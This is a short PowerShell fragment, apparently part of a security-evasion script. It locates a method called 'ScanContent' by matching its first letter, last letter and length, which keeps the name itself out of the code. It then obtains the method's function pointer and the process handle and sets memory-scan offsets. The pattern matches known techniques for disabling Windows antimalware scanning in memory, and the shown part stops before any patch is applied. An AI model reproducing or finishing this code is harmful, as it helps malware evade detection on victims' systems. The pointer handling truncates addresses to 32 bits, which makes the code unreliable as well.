$Methods | ForEach-Object {
    if($_.Name -ne $null){
        # 'ScanContent' is exactly 11 characters
        if($_.Name.StartsWith('S') -and $_.Name.EndsWith('t') -and $_.Name.Length -eq 11) {
             $MethodFound = $_
        }
    }
}

[IntPtr] $MethodPointer = [Int32]$MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [System.Diagnostics.Process]::GetCurrentProcess().Handle
[IntPtr] $funcAddr = $MethodPointer

$dummy = 0
$InitialDate = Get-Date
$InitialStart = 0
$MaxOffset = 500000 
$NegativeOffset = 512
$ReadBytes = 1024

Write-Host "Success: MethodPointer initialized at $MethodPointer (32-bit)" -ForegroundColor Green
